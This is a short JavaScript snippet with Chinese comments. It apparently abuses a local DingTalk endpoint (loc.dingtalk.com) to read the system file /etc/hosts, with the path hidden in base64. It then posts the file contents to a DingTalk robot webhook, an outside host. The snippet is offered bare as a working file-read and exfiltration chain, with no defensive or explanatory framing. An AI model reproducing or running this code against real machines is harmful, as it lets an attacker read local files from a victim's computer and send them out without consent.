// 读取 /etc/hsots
fetch('https://loc.dingtalk.com/L2V0Yy9ob3N0cw==')
  .then(response => response.text())
  .then(textData => {
    // 构造json
    const data = {
      text: textData
    };

    // https://oapi.dingtalk.com/ 机器人什么的
    fetch('https://oapi.dingtalk.com/robot/send?access_token=xxxxxxx', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(data)
    })
      .then(response => response.json())
      .then(result => {
        console.log('API 返回的结果：', result);
      })
      .catch(error => {
        console.error('发送数据时发生错误:', error);
      });
  })
  .catch(error => {
    console.error('读取文本数据时发生错误:', error);
  });
